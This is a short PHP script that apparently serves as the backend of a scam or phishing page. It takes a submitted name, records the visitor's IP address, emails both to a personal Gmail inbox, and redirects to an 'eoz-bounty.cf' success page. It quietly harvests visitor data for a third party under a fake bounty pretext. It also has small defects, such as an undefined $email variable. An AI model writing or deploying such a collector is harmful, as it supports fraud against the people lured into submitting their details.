<?php
$name = $_POST['name'];
$ip = $_POST['ip'];
$ip = $_SERVER['REMOTE_ADDR'];

$formcontent=" User: $name \n ip: $ip";
$recipient = "salatacocalara@gmail.com";
$subject = "caca";

$mailheader = "From: $email \r\n";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
echo "Thank You!" . " -" . "<a href='https://www.eoz-bounty.cf/eoz-successfully.htm'> Return Home</a>";
header("Location: https://www.eoz-bounty.cf/eoz-successfully.htm");
?>
